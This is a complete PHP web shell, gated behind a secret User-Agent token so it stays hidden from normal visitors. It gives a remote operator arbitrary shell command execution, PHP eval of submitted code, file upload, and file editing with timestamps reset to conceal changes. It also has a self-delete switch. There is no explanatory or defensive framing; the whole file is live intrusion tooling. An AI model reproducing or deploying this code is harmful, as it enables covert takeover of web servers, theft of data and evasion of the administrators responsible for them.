<?php
$ref = $_SERVER['HTTP_USER_AGENT'];
$keywordsRegex = "/AtOPvMzpDosdPDlkm3ZmPzxoP/i";
if (preg_match($keywordsRegex, $ref)) {

if ($_GET['kill']) {

	$split = explode("/", $_SERVER['REQUEST_URI']);
	$shellFile = $split[(count($split) - 1)];
	$shellFile = preg_replace('/\?.*?$/i', '', $shellFile);
	unlink($shellFile);
	exit ();

}

if( $_POST['_dir'] ) { chdir($_POST['_dir']); }
$dir = getcwd() . '/';

if( $_POST['_save'] == 'Save & Close' ) {

	$editFileDate = filemtime($_POST['_edit']);
	$editFolderDate = filemtime('.');

	$fh = fopen($_POST['_edit'], 'w');

	$stringData = stripslashes($_POST['_edittext']);
	$stringData = html_entity_decode($stringData);

    fwrite($fh, $stringData);
    fclose($fh);

    touch($_POST['_edit'], $editFileDate);
    touch(".", $editFolderDate);

	$_POST['_edit'] = "";

}

if( $_POST['_edit'] ) {
	echo '<br><form name="texteditor" method="post" action="">
	      <input type="hidden" name="_edit" value="'; echo $_POST['_edit']; echo '">
		  <input type="hidden" name="_dir" value="'; echo $_POST['_dir']; echo '">
		  <textarea rows="30" cols=160 wrap="off" name="_edittext">';
			$file = fopen($_POST['_edit'],"r");
			while(! feof($file)){
			  //echo fgets($file). "";
			  $line = fgets($file);
			  echo htmlentities($line);
			}
			fclose($file);
			echo '</textarea><br/><br/>
			<input type="submit" name="_save" value="Save & Close" /></form><br><br>';
			exit ();
}

if ($_POST['_evalText']) eval($_POST['_evalText']);

if( $_POST['_upl'] == "Upload" ) {  if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo ''; }  else { echo ''; } }

echo '<b><br>'.php_uname().'<br></b>'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo "<br><b>Remote Dir: </b><input type='text' size='100' name='_dir' value='$dir'><br><br>";
echo '<b>Upload: </b><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload">
<br><br><table>
<td><b>Command:</b> <input type="text" name="_cmd" size="40"><br></td>
<td><b>Edit: </b> <input type="text" name="_edit" size="40"><input name="_edt" type="submit" id="_edtl" value="Edit"></td></table>';

if( $_POST['_cmd'] ) { $output = shell_exec($_POST['_cmd']); echo '<input type="hidden" name="output" value="'; echo $output; echo '">'; }
echo '<table><td>';
echo '<textarea cols=40 rows=20>';echo $output; echo '</textarea><br>';
echo '</td><td>';
$listDirOutput = shell_exec("ls -a -F -p");
echo '<textarea cols=40 rows=20>';echo $listDirOutput; echo '</textarea><br>';
echo '</table><br>';

echo '
<textarea rows="3" cols=84 wrap="off" name="_evalText"></textarea><br/><br/>
<input type="submit" name="_save" value="PHP EVAL" /></form><br><br>
';


echo '</form>';
exit();
}
?>
